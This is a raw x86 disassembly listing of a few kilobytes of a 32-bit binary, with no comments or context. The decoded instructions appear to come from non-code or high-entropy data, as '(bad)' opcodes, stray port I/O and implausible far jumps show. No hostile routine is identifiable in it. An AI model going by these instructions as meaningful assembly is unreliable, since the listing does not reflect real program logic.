  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	xchg   edi,eax
  41ab01:	mov    ds:0x1b44dd1e,eax
  41ab06:	add    DWORD PTR [eax],eax
  41ab08:	add    eax,0xc1000001
  41ab0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab0e:	test   BYTE PTR [edi],ch
  41ab10:	add    al,0x23
  41ab12:	pop    es
  41ab13:	push   eax
  41ab14:	mov    dh,0xb2
  41ab16:	in     eax,dx
  41ab17:	imul   esp,DWORD PTR [ebp+0x2e],0x39
  41ab1b:	cmp    esp,DWORD PTR [eax+eiz*8-0x6e]
  41ab1f:	push   eax
  41ab20:	popa   
  41ab21:	xchg   esi,eax
  41ab22:	retf   0xcf3d
  41ab25:	in     eax,dx
  41ab26:	add    DWORD PTR [ebx+eiz*2],0x4d
  41ab2a:	out    dx,al
  41ab2b:	loope  0x41aacd
  41ab2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab2e:	dec    ecx
  41ab2f:	pop    ebx
  41ab30:	das    
  41ab31:	jno    0x41aafd
  41ab33:	sahf   
  41ab34:	lods   al,BYTE PTR ds:[esi]
  41ab35:	and    esp,DWORD PTR [edi+0x14]
  41ab38:	push   cs
  41ab39:	imul   DWORD PTR [edx-0x13384e02]
  41ab3f:	cmp    ecx,esi
  41ab41:	sahf   
  41ab42:	sub    eax,0x7419ed1b
  41ab47:	and    edi,DWORD PTR [ecx-0x265780c2]
  41ab4d:	fidivr DWORD PTR [edx+0x7eef8a8]
  41ab53:	pop    ebp
  41ab54:	fld    DWORD PTR [edi+0x47e1546e]
  41ab5a:	and    ecx,edx
  41ab5c:	or     al,0x58
  41ab5e:	hlt    
  41ab5f:	mov    dh,0xcb
  41ab61:	push   es
  41ab62:	xor    esi,esi
  41ab64:	inc    esi
  41ab65:	stos   BYTE PTR es:[edi],al
  41ab66:	push   eax
  41ab67:	std    
  41ab68:	mov    cl,0x7b
  41ab6a:	dec    ecx
  41ab6b:	mov    WORD PTR [edx+0x25],fs
  41ab6e:	mov    bl,0x93
  41ab70:	outs   dx,BYTE PTR ds:[esi]
  41ab71:	in     al,0xfe
  41ab73:	xor    ebp,0x2a
  41ab76:	ja     0x41abe9
  41ab78:	push   ds
  41ab79:	xor    al,0x9
  41ab7b:	ror    dh,cl
  41ab7d:	xchg   ebp,eax
  41ab7e:	out    0xca,al
  41ab80:	mov    bh,0xf
  41ab82:	gs inc esi
  41ab84:	or     ah,dh
  41ab86:	lods   eax,DWORD PTR ds:[esi]
  41ab87:	(bad)  
  41ab88:	cmc    
  41ab89:	push   ebp
  41ab8a:	mov    ds:0x3507a54c,al
  41ab8f:	bound  ebp,QWORD PTR [ecx+0x5e]
  41ab92:	sub    esi,ebp
  41ab94:	jbe    0x41abd6
  41ab96:	xchg   esi,eax
  41ab97:	mov    al,0xdf
  41ab99:	sub    esi,DWORD PTR [eax-0x7258c1a9]
  41ab9f:	mov    ebp,0x4f8459ef
  41aba4:	in     al,0x61
  41aba6:	loopne 0x41ab79
  41aba8:	out    dx,al
  41aba9:	add    BYTE PTR [ebx-0x27],dh
  41abac:	cmp    ecx,ebx
  41abae:	neg    BYTE PTR [ebx]
  41abb0:	lods   al,BYTE PTR ds:[esi]
  41abb1:	xchg   edi,eax
  41abb2:	popf   
  41abb3:	pop    eax
  41abb4:	cmp    esp,ecx
  41abb6:	jg     0x41abcf
  41abb8:	cwde   
  41abb9:	xchg   edi,eax
  41abba:	aaa    
  41abbb:	fwait
  41abbc:	(bad)  
  41abbe:	mov    esi,0x3f17236d
  41abc3:	imul   ebp,DWORD PTR [edi+0x37],0xfffffff1
  41abc7:	ret    0x8710
  41abca:	mov    al,0xf2
  41abcc:	cmp    edi,eax
  41abce:	outs   dx,BYTE PTR ds:[esi]
  41abcf:	adc    BYTE PTR [eax],ah
  41abd1:	scas   al,BYTE PTR es:[edi]
  41abd2:	mov    dl,0xc0
  41abd4:	push   ebx
  41abd5:	adc    al,0x40
  41abd7:	xchg   ecx,eax
  41abd8:	xor    eax,esp
  41abda:	xchg   ebx,eax
  41abdb:	adc    edi,DWORD PTR [eax-0x1b96f86d]
  41abe1:	retf   0x564a
  41abe4:	call   0xff2a2b5a
  41abe9:	shl    DWORD PTR [edi],1
  41abeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abec:	cdq    
  41abed:	(bad)  
  41abee:	out    0x17,eax
  41abf0:	cmp    BYTE PTR [ebx],cl
  41abf2:	hlt    
  41abf3:	(bad)  
  41abf5:	mov    ds:0x3736a8c4,eax
  41abfa:	fs repz cmp dl,dl
  41abfe:	je     0x41ac47
  41ac00:	rcr    BYTE PTR [ebp+edi*8+0x69],1
  41ac04:	out    dx,al
  41ac05:	mov    esp,DWORD PTR [eax-0x142de4dc]
  41ac0b:	xchg   esi,eax
  41ac0c:	jp     0x41ac09
  41ac0e:	inc    edi
  41ac0f:	inc    ebp
  41ac10:	jmp    0x41ac12
	...
  41ac72:	add    BYTE PTR [eax],al
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+ebp*1+0x6]
  41ac82:	retf   
  41ac83:	add    cl,BYTE PTR [ecx+0x1c]
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    eax,0x52000001
  41ac8d:	mov    ebp,0xc27ac079
  41ac92:	dec    ecx
  41ac93:	mov    ah,0x80
  41ac95:	xor    DWORD PTR [eax+esi*1+0x0],eax
  41ac99:	push   esi
  41ac9a:	sbb    DWORD PTR cs:[bp+di],0x1264cc82
  41aca2:	cmp    al,0x7b
  41aca4:	iret   
  41aca5:	xchg   esp,eax
  41aca6:	cld    
  41aca7:	pop    es
  41aca8:	or     esp,0xffffff85
  41acab:	cmp    bh,BYTE PTR [eax+0x6c8b6cde]
  41acb1:	and    edx,eax
  41acb3:	int3   
  41acb4:	mov    ebx,0xd9d96928
  41acb9:	out    0x1,eax
  41acbb:	sub    eax,0x89ad7d63
  41acc0:	loopne 0x41acaa
  41acc2:	inc    eax
  41acc3:	ja     0x41ad3b
  41acc5:	dec    eax
  41acc6:	mov    dl,0x72
  41acc8:	popa   
  41acc9:	mov    eax,0x503f4ef1
  41acce:	jmp    0x41acc5
  41acd0:	loop   0x41ac58
  41acd2:	lahf   
  41acd3:	stos   BYTE PTR es:[edi],al
  41acd4:	add    eax,0x1674e458
  41acd9:	cmp    eax,0xd4f5ad04
  41acde:	mov    eax,0xdb2f0149
  41ace3:	and    eax,0x4e2f1eb3
  41ace8:	xor    BYTE PTR [eax],0x3c
  41aceb:	test   DWORD PTR [edx-0x2bafd6a],ebx
  41acf1:	adc    DWORD PTR [ebx],edx
  41acf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf4:	xor    bh,BYTE PTR [ebx-0x76]
  41acf7:	loopne 0x41acf8
  41acf9:	mov    bl,bl
  41acfb:	cmp    dl,cl
  41acfd:	xchg   ebp,eax
  41acfe:	push   edi
  41acff:	mov    esp,0xf17c356c
  41ad04:	push   edx
  41ad05:	call   FWORD PTR ds:[ebx+0xcfdfb7c]
  41ad0c:	ret    
  41ad0d:	sbb    al,0xfb
  41ad0f:	xchg   ecx,eax
  41ad10:	jb     0x41ad44
  41ad12:	xor    bl,cl
  41ad14:	jmp    0x8f08:0x8018ac2
  41ad1b:	push   0x67
  41ad1d:	jmp    0x41ad83
  41ad1f:	xchg   edx,eax
  41ad20:	inc    esp
  41ad21:	adc    BYTE PTR [ebx-0x33],cl
  41ad24:	jbe    0x41acc8
  41ad26:	mov    fs,WORD PTR ds:0xa440c67b
  41ad2c:	or     al,0xb9
  41ad2e:	jl     0x41aced
  41ad30:	jnp    0x41ad0f
  41ad32:	jbe    0x41ad4d
  41ad34:	cmp    ebx,DWORD PTR [ecx-0x614975a8]
  41ad3a:	inc    ecx
  41ad3b:	jmp    0xd3fc:0x7bb94ebf
  41ad42:	mov    dh,BYTE PTR [edi]
  41ad44:	out    0xe,eax
  41ad46:	bound  bp,DWORD PTR ss:0xfe6378e9
  41ad4e:	jno    0x41ad6a
  41ad50:	std    
  41ad51:	pop    ecx
  41ad52:	js     0x41ad4f
  41ad54:	jnp    0x41ad98
  41ad56:	xchg   BYTE PTR [ebx-0x35],dh
  41ad59:	cmp    edx,DWORD PTR [ecx]
  41ad5b:	arpl   WORD PTR ds:[eax-0xcbd9ef7],si
  41ad62:	imul   eax,DWORD PTR [bp+si-0x2],0xbb70981d
  41ad6a:	xor    al,0x9c
  41ad6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad6d:	cmp    esp,DWORD PTR [esi+0x55]
  41ad70:	pop    esi
  41ad71:	adc    ebx,0xffffffb0
  41ad74:	push   ebp
  41ad75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad76:	push   ebp
  41ad77:	jbe    0x41adb1
  41ad79:	or     dh,dh
  41ad7b:	int    0x3d
  41ad7d:	fistp  QWORD PTR [ebp-0x4945ec10]
  41ad83:	xchg   BYTE PTR ss:[edx+0x7a09bdfc],bl
  41ad8a:	popa   
  41ad8b:	xor    DWORD PTR [eax-0x6e],0xffffff99
  41ad8f:	(bad)  
  41ad90:	sbb    eax,DWORD PTR [eax]
	...
  41adf2:	add    BYTE PTR [eax],al
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebp+eax*2+0x4e979007],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	out    0xd3,eax
  41ae0e:	cmp    eax,0xc56e46d3
  41ae13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae14:	fnstsw WORD PTR [esi]
  41ae16:	or     eax,edx
  41ae18:	jge    0x41ae09
  41ae1a:	loop   0x41adde
  41ae1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae1d:	ror    DWORD PTR [ecx-0x107c022c],0xf5
  41ae24:	lahf   
  41ae25:	stos   BYTE PTR es:[edi],al
  41ae26:	pop    ss
  41ae27:	add    DWORD PTR [edi],ebx
  41ae29:	sub    eax,0x64754875
  41ae2e:	xlat   BYTE PTR ds:[ebx]
  41ae2f:	push   ss
  41ae30:	push   0xffffffd4
  41ae32:	cs pop ss
  41ae34:	jecxz  0x41ae6f
  41ae36:	ret    0x9e72
  41ae39:	test   al,0xcf
  41ae3b:	imul   eax,DWORD PTR [ebx+0x31],0x47
  41ae3f:	dec    eax
  41ae40:	jle    0x41ae1f
  41ae42:	dec    esi
  41ae43:	shr    edi,cl
  41ae45:	mov    WORD PTR [edx+eiz*4-0x1],ss
  41ae49:	pop    esi
  41ae4a:	mov    eax,ds:0xfc479
  41ae4f:	mov    ds:0x5496a4d0,eax
  41ae54:	fs cmc 
  41ae56:	scas   al,BYTE PTR es:[edi]
  41ae57:	jecxz  0x41ae12
  41ae59:	neg    BYTE PTR [edi+esi*2-0x41]
  41ae5d:	test   BYTE PTR [eax+0x4d67c74],bl
  41ae63:	aaa    
  41ae64:	pop    esp
  41ae66:	and    DWORD PTR [ebx+0x31d497f5],edx
  41ae6c:	add    al,0xa
  41ae6e:	nop
  41ae6f:	xor    ebx,DWORD PTR [eax-0x78]
  41ae72:	sbb    DWORD PTR [esi+eax*2],esi
  41ae75:	sti    
  41ae76:	(bad)  [eax+0x60831966]
  41ae7c:	jne    0x41ae4c
  41ae7e:	jae    0x41aead
  41ae80:	aaa    
  41ae81:	add    ebx,DWORD PTR [esp+esi*4-0x4c1cd5ac]
  41ae88:	mov    dh,0xab
  41ae8a:	inc    edi
  41ae8b:	cmp    ebp,DWORD PTR [ebx]
  41ae8d:	(bad)  
  41ae8e:	dec    edx
  41ae8f:	data16 (bad) 
  41ae91:	xchg   esp,eax
  41ae92:	push   esp
  41ae93:	cmp    DWORD PTR [eax+eiz*8],edi
  41ae96:	inc    eax
  41ae97:	pusha  
  41ae98:	rol    ebx,1
  41ae9a:	cmp    DWORD PTR [esi-0x3a],ebp
  41ae9d:	jno    0x41ae5a
  41ae9f:	cmc    
  41aea0:	jl     0x41aed0
  41aea2:	loopne 0x41aee1
  41aea4:	ret    0xd27b
  41aea7:	out    dx,al
  41aea8:	fistp  DWORD PTR [ebx+0x5ad3f20]
  41aeae:	int3   
  41aeaf:	jne    0x41ae85
  41aeb1:	xchg   ebp,eax
  41aeb2:	outs   dx,DWORD PTR ds:[esi]
  41aeb3:	inc    ecx
  41aeb4:	jno    0x41af25
  41aeb6:	sbb    eax,0x3fc7a442
  41aebb:	sbb    al,0xb4
  41aebd:	addr16 pop eax
  41aebf:	adc    dl,BYTE PTR [edx+0x2b]
  41aec2:	jecxz  0x41ae9c
  41aec4:	loop   0x41af25
  41aec6:	pop    esp
  41aec7:	dec    edx
  41aec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeca:	push   esp
  41aecb:	xchg   ebp,eax
  41aecc:	fdiv   QWORD PTR [ecx-0x78da008d]
  41aed2:	xchg   ebp,eax
  41aed3:	push   ss
  41aed4:	adc    al,0x61
  41aed6:	not    dh
  41aed8:	ja     0x41aea4
  41aeda:	mov    dl,0x2b
  41aedc:	test   WORD PTR [edx+0x18],ax
  41aee0:	sub    BYTE PTR [ebp-0x6024c12],cl
  41aee6:	mov    edi,DWORD PTR [edx-0x67]
  41aee9:	add    ebp,DWORD PTR [ebp+ebx*1-0x76bae978]
  41aef0:	lahf   
  41aef1:	add    bl,cl
  41aef3:	cmp    DWORD PTR [eax+0x4f],0x5f
  41aef7:	jno    0x41aea6
  41aef9:	sub    al,0xc8
  41aefb:	xchg   ebp,eax
  41aefc:	inc    esp
  41aefd:	xchg   edx,eax
  41aefe:	adc    al,0xfb
  41af00:	dec    ecx
  41af01:	lahf   
  41af02:	sbb    al,0xd
  41af04:	and    eax,0xf5b5cf9e
  41af09:	dec    edx
  41af0a:	dec    ebp
  41af0b:	sub    esi,esi
  41af0d:	pop    esp
  41af0e:	jmp    0x41af1f
  41af10:	jns    0x41af12
	...
  41af72:	add    BYTE PTR [eax],al
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xefb044ee
  41af82:	dec    esp
  41af83:	add    edx,DWORD PTR [ebx+0x1e]
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0xd8000001
  41af8d:	in     eax,dx
  41af8e:	mov    eax,ds:0x9f6ba136
  41af93:	push   ebx
  41af94:	push   eax
  41af95:	mov    al,ds:0xc615851a
  41af9a:	dec    edi
  41af9b:	adc    esi,DWORD PTR [ecx-0x46b29e9]
  41afa1:	mov    ds:0x3628baa,al
  41afa6:	mov    eax,ecx
  41afa8:	jge    0x41afd0
  41afaa:	sbb    ecx,0xffffff9c
  41afad:	loop   0x41af49
  41afaf:	aam    0xa3
  41afb1:	xor    DWORD PTR [edi+eiz*4-0x1153ed96],ebx
  41afb8:	cwde   
  41afb9:	cld    
  41afba:	jnp    0x41af82
  41afbc:	sahf   
  41afbd:	dec    esi
  41afbe:	ficomp DWORD PTR [edi]
  41afc0:	out    0xa5,eax
  41afc2:	hlt    
  41afc3:	mov    esp,0xab57ca98
  41afc8:	rcr    BYTE PTR [ebx],cl
  41afca:	mov    eax,ds:0xf4b1512d
  41afcf:	popf   
  41afd0:	pop    eax
  41afd1:	shr    BYTE PTR [eax+0x33],0x67
  41afd5:	push   ss
  41afd6:	loop   0x41b041
  41afd8:	fbstp  TBYTE PTR [eax-0x6115b6ab]
  41afde:	popw   es
  41afe0:	adc    eax,0x2698c0f8
  41afe5:	das    
  41afe6:	daa    
  41afe7:	add    DWORD PTR [esi+0x3c91cd4d],edi
  41afed:	adc    dl,dl
  41afef:	daa    
  41aff0:	or     ah,cl
  41aff2:	mov    ebp,0xef714f19
  41aff7:	int3   
  41aff8:	es mov eax,0x68a9c5f0
  41affe:	test   al,0x8f
  41b000:	mov    ebp,0xaf0f7517
  41b005:	mov    BYTE PTR [ebx+0xe90e8ef],dl
  41b00b:	fs xchg ecx,eax
  41b00d:	rol    BYTE PTR [ecx],cl
  41b00f:	sbb    DWORD PTR ds:0x2b532fc8,edi
  41b016:	adc    al,0x4b
  41b018:	lock shl BYTE PTR [edx+0x1f],cl
  41b01c:	fld    TBYTE PTR [ecx]
  41b01e:	and    al,0x98
  41b020:	scas   al,BYTE PTR es:[edi]
  41b021:	lods   al,BYTE PTR ds:[esi]
  41b022:	cmp    eax,0x904b1e2e
  41b027:	lea    edi,[edi+0x7d]
  41b02a:	stos   BYTE PTR es:[edi],al
  41b02b:	push   ecx
  41b02c:	mov    edx,0x2f89a260
  41b031:	adc    BYTE PTR [ebp-0x740702ca],al
  41b037:	adc    BYTE PTR [ecx],ch
  41b039:	mov    ds:0x4c0b5ad5,al
  41b03e:	shr    BYTE PTR [ecx],cl
  41b040:	fidiv  WORD PTR [esi+eax*8-0x646df107]
  41b047:	adc    dh,BYTE PTR [edi+0x30]
  41b04a:	imul   eax,ecx,0x9bf50d60
  41b050:	cld    
  41b051:	es ins BYTE PTR es:[edi],dx
  41b053:	mov    eax,0xab87ed5e
  41b058:	shl    esi,1
  41b05a:	(bad)  
  41b05c:	add    BYTE PTR [ecx],cl
  41b05e:	and    eax,0x5fb1fa3c
  41b063:	xor    edx,DWORD PTR [eax-0x4c187c9]
  41b069:	sub    ah,ah
  41b06b:	enter  0x1917,0xeb
  41b06f:	push   esi
  41b070:	outs   dx,DWORD PTR ds:[esi]
  41b071:	fs in  eax,0x8a
  41b074:	cmc    
  41b075:	retf   
  41b076:	jl     0x41b0d3
  41b078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b07a:	stos   DWORD PTR es:[edi],eax
  41b07b:	mov    eax,ds:0xf0f5e37c
  41b080:	sbb    BYTE PTR [edi],0x20
  41b083:	push   cs
  41b084:	add    BYTE PTR [ecx+0x9],ah
  41b087:	push   ebp
  41b088:	out    dx,al
  41b089:	dec    esp
  41b08a:	mov    ds:0xe0c3b692,al
  41b08f:	and    eax,0x78
	...
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xf21c8f18
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x11000001
  41b10d:	jnp    0x41b0e9
  41b10f:	xor    cl,ah
  41b111:	cmp    eax,0x49ed5f48
  41b116:	and    eax,0x1d8e9940
  41b11b:	push   ecx
  41b11c:	jmp    0x41b0e7
  41b11e:	and    eax,0x4cf6c92d
  41b123:	sub    esp,DWORD PTR [esi]
  41b125:	arpl   WORD PTR ds:0xcbb47f11,sp
  41b12b:	repnz sbb DWORD PTR [edi+0x2461af6f],edi
  41b132:	and    eax,0xa853dc14
  41b137:	aad    0x2d
  41b139:	ret    
  41b13a:	ss pushf 
  41b13c:	xor    BYTE PTR [ebx+ecx*8-0x3822c622],ch
  41b143:	and    BYTE PTR [ebx-0x401f76e1],0x78
  41b14a:	dec    eax
  41b14b:	call   0x1ca8d00b
  41b150:	je     0x41b0f7
  41b152:	cwde   
  41b153:	ins    BYTE PTR es:[edi],dx
  41b154:	dec    edx
  41b155:	sbb    BYTE PTR [ebx],bl
  41b157:	(bad)  
  41b159:	cmp    DWORD PTR [eax],ecx
  41b15b:	cld    
  41b15c:	dec    edi
  41b15d:	pop    edi
  41b15e:	cmp    esi,DWORD PTR [ebp+0x4f2bb2e9]
  41b164:	pop    ds
  41b165:	push   edx
  41b166:	pop    ds
  41b167:	push   es
  41b168:	fcomp  DWORD PTR [edx-0x56]
  41b16b:	imul   edi,esi,0x7af36d46
  41b171:	sub    DWORD PTR [eax-0x1dbf6609],eax
  41b177:	inc    esp
  41b178:	pushf  
  41b179:	call   0x1f5f5426
  41b17e:	mov    edi,DWORD PTR [eax-0x41]
  41b181:	jno    0x41b1cb
  41b183:	or     al,0xda
  41b185:	xor    eax,0xd1cb55b8
  41b18a:	loop   0x41b188
  41b18c:	mov    esp,0x99ed04a4
  41b191:	xlat   BYTE PTR ds:[ebx]
  41b192:	jae    0x41b18a
  41b194:	xor    DWORD PTR [esi],ebp
  41b196:	mov    cs,WORD PTR [ebx-0x54bc9f56]
  41b19c:	(bad)  
  41b19e:	ins    BYTE PTR es:[edi],dx
  41b19f:	inc    edx
  41b1a0:	pushf  
  41b1a1:	push   edx
  41b1a2:	gs in  al,0x69
  41b1a5:	xor    ebx,DWORD PTR [ecx-0x3d]
  41b1a8:	mov    edi,0x89e1c513
  41b1ad:	jp     0x41b1d4
  41b1af:	out    dx,eax
  41b1b0:	xchg   edx,eax
  41b1b1:	push   edi
  41b1b2:	pushf  
  41b1b3:	popa   
  41b1b4:	mov    ch,0xf6
  41b1b6:	adc    eax,0xf556838
  41b1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1bc:	mov    ah,BYTE PTR [esi+0x15]
  41b1bf:	push   ds
  41b1c0:	sbb    BYTE PTR [ecx+eiz*1+0x6d],0xf
  41b1c5:	inc    ebx
  41b1c6:	xchg   ebp,eax
  41b1c7:	call   0xba3:0xaeac0b6b
  41b1ce:	push   ecx
  41b1cf:	stos   DWORD PTR es:[edi],eax
  41b1d0:	lods   al,BYTE PTR ds:[esi]
  41b1d1:	add    DWORD PTR [ecx+0x2d],ecx
  41b1d4:	sbb    eax,0xfb7a093d
  41b1d9:	mov    BYTE PTR [esi+0x73],ah
  41b1dc:	xchg   ecx,eax
  41b1dd:	jmp    0x41b1ab
  41b1df:	nop
  41b1e0:	inc    ebp
  41b1e1:	adc    DWORD PTR ds:0xdffdddb6,eax
  41b1e7:	push   0xffffffb2
  41b1e9:	and    bl,BYTE PTR [esi+0x14]
  41b1ec:	(bad)  
  41b1ed:	(bad)  
  41b1ee:	fisttp DWORD PTR [edi]
  41b1f0:	(bad)  
  41b1f1:	pop    ss
  41b1f2:	shr    BYTE PTR [esi-0x51],1
  41b1f5:	mov    WORD PTR [ebx+0x3c],es
  41b1f8:	(bad)  [ebx+edi*1]
  41b1fb:	and    eax,DWORD PTR [ebx-0x72]
  41b1fe:	arpl   WORD PTR [esi-0x9],bp
  41b201:	mov    edi,0x5a0d0028
  41b206:	retf   
  41b207:	sbb    al,0xe3
  41b209:	or     al,0x93
  41b20b:	jno    0x41b1bf
  41b20d:	jl     0x41b1be
  41b20f:	pop    edi
  41b210:	sbb    eax,DWORD PTR [eax]
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebx],bl
  41b281:	mov    ebp,0x205d81dc
  41b286:	add    DWORD PTR [eax],eax
  41b288:	add    eax,0x9c000001
  41b28d:	imul   eax,DWORD PTR [ebp-0x72],0x48da0920
  41b294:	push   0x66387462
  41b299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b29a:	jno    0x41b255
  41b29c:	pop    ebp
  41b29d:	pop    edx
  41b29e:	icebp  
  41b29f:	add    edx,esi
  41b2a1:	lods   eax,DWORD PTR ds:[esi]
  41b2a2:	push   ebp
  41b2a3:	pop    ebx
  41b2a4:	sar    BYTE PTR ds:0x8aaa65fe,0xa3
  41b2ab:	inc    esp
  41b2ac:	dec    edi
  41b2ad:	push   ebp
  41b2ae:	int    0x92
  41b2b0:	pop    ebx
  41b2b1:	fdivr  QWORD PTR [edx+0x1151bae]
  41b2b7:	adc    eax,0xfe02d3a6
  41b2bc:	inc    ebx
  41b2bd:	hlt    
  41b2be:	out    dx,eax
  41b2bf:	leave  
  41b2c0:	push   0xb8b792e
  41b2c5:	cmp    eax,0xa320dfbd
  41b2ca:	inc    eax
  41b2cb:	mov    ah,0x49
  41b2cd:	sub    al,0xef
  41b2cf:	loopne 0x41b25b
  41b2d1:	and    al,0x5
  41b2d3:	jb     0x41b2a0
  41b2d5:	mov    ch,BYTE PTR [edx-0x5d]
  41b2d8:	clc    
  41b2d9:	cmp    DWORD PTR [edi-0x3a],0x312100f0
  41b2e0:	sub    DWORD PTR [edi+0x5c2c2de2],edi
  41b2e6:	xor    ebp,DWORD PTR [esi]
  41b2e8:	sub    eax,0xb55100e1
  41b2ed:	rol    dh,cl
  41b2ef:	and    esp,ebp
  41b2f1:	and    DWORD PTR [ebx],edi
  41b2f3:	jmp    0xeb6292f6
  41b2f8:	or     al,0x9c
  41b2fa:	add    bl,BYTE PTR [ecx+0x2489a5b]
  41b300:	jae    0x41b298
  41b302:	pop    es
  41b303:	repnz cmp ecx,edi
  41b306:	push   ecx
  41b307:	fisttp QWORD PTR [ebp+0xef3fbd2]
  41b30d:	jmp    0xfc7c:0x55edc98e
  41b314:	or     DWORD PTR [ecx],esp
  41b316:	pusha  
  41b317:	xchg   BYTE PTR ds:0x97d315fa,dl
  41b31d:	inc    edx
  41b31e:	aas    
  41b31f:	xchg   esp,eax
  41b320:	int    0x1a
  41b322:	(bad)  
  41b323:	imul   BYTE PTR [esi]
  41b325:	xor    BYTE PTR [esi+0xa172d4f],al
  41b32b:	out    0xb7,al
  41b32d:	adc    al,0x10
  41b32f:	or     al,BYTE PTR [ecx+0x68]
  41b332:	fdiv   st,st(3)
  41b334:	push   0xf30f5def
  41b339:	xor    DWORD PTR [edi-0x7110b132],edi
  41b33f:	mov    fs,ebx
  41b341:	pop    ds
  41b342:	leave  
  41b343:	mov    gs,WORD PTR [ecx+0x2e]
  41b346:	dec    eax
  41b347:	jg     0x41b387
  41b349:	inc    edi
  41b34a:	sar    DWORD PTR [ecx-0xad91c7],1
  41b350:	jl     0x41b2f8
  41b352:	data16 (bad) 
  41b354:	das    
  41b355:	jo     0x41b2de
  41b357:	mov    esp,0x16ac2400
  41b35c:	sar    dl,0xa1
  41b35f:	outs   dx,DWORD PTR ds:[esi]
  41b360:	cs pop ss
  41b362:	loopne 0x41b383
  41b364:	xor    BYTE PTR [ecx+0x6fea13d],dl
  41b36a:	pop    edi
  41b36b:	pusha  
  41b36c:	push   eax
  41b36d:	jbe    0x41b31a
  41b36f:	sahf   
  41b370:	mov    bh,0xe7
  41b372:	jo     0x41b301
  41b374:	pushf  
  41b375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b376:	pop    ebp
  41b377:	push   ebx
  41b378:	pop    es
  41b379:	aaa    
  41b37a:	pop    ds
  41b37b:	push   ebx
  41b37c:	loopne 0x41b394
  41b37e:	dec    ebp
  41b37f:	cld    
  41b380:	or     al,0x43
  41b382:	jge    0x41b305
  41b384:	(bad)  
  41b385:	out    0x54,eax
  41b387:	dec    esi
  41b388:	dec    edi
  41b389:	pop    es
  41b38a:	xchg   DWORD PTR [ecx+0xdc56a79],esi
  41b390:	mov    bl,0x0
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	ds jecxz 0x41b3ef
  41b403:	fbld   TBYTE PTR [edx+0x21]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0xeb000001
  41b40d:	sub    edi,0xd55f1b7a
  41b413:	mov    al,0xc1
  41b415:	fwait
  41b416:	cmp    DWORD PTR [ecx-0x118234b0],0xc2bda005
  41b420:	mov    ah,0x4c
  41b422:	inc    ebx
  41b423:	loopne 0x41b3e5
  41b425:	aad    0xc1
  41b427:	leave  
  41b428:	sahf   
  41b429:	ins    DWORD PTR es:[edi],dx
  41b42a:	ja     0x41b421
  41b42c:	jae    0x41b3fc
  41b42e:	sti    
  41b42f:	push   esi
  41b430:	adc    eax,0xa9d26e56
  41b435:	adc    eax,0xbe24790f
  41b43a:	into   
  41b43b:	ret    0x55ae
  41b43e:	test   DWORD PTR [ebx-0x4bc9e270],esp
  41b444:	sub    BYTE PTR [esi],dh
  41b446:	or     eax,0x68c4bbd4
  41b44b:	sub    al,0x8
  41b44d:	inc    ecx
  41b44e:	lods   eax,DWORD PTR ds:[esi]
  41b44f:	pop    eax
  41b450:	mov    cl,0xa
  41b452:	push   edx
  41b453:	popa   
  41b454:	hlt    
  41b455:	mov    bl,0xef
  41b457:	lahf   
  41b458:	adc    ecx,esp
  41b45a:	aam    0x9d
  41b45c:	idiv   DWORD PTR [edi+esi*4+0x39]
  41b460:	test   al,0x85
  41b462:	sbb    eax,0x57271973
  41b467:	jmp    0x13eef756
  41b46c:	dec    esi
  41b46d:	lods   al,BYTE PTR ds:[esi]
  41b46e:	add    al,0xb5
  41b470:	add    BYTE PTR ds:[ebp+edi*1-0x3608f309],0x33
  41b479:	cld    
  41b47a:	stc    
  41b47b:	sbb    dl,al
  41b47d:	in     al,0xab
  41b47f:	test   al,0x66
